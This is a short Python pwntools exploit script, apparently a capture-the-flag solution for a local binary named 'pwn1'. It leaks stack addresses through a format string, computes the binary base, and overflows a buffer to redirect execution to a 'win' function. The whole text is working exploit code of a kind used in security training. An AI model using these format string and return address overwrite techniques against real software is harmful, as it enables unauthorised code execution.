from pwn import *

p = process("./pwn1")
p.recvuntil(b"Enter your witch name:")
p.sendline(b'%p|' * 42)
leaks = p.recvuntil(b"your magic spell:").decode().split("|")

MAIN = int(leaks[38], 16)
mainOffset = 0xb21
WINoffset = 0x9ec
binaryAddr = MAIN - mainOffset

log.info(f"Main: {hex(MAIN)}")
log.info(f"Main Offset: {hex(mainOffset)}")
log.info(f"WIN Offset: {hex(WINoffset)}")
log.info(f"Binary Add: {hex(binaryAddr)}")

win = hex(binaryAddr + WINoffset)
log.info(f"WIN Func: {win}")
# print(int(win, 16))
# print(int(win, 16))
raw_input("attach gdb")
print(int(win,16))
print(p64(int(win,16)))
payload  = b"Expelliarmus\x00"
payload += b"A" * cyclic_find('cnaa')
payload += p64(int(win,16))

p.sendline(payload)
p.interactive()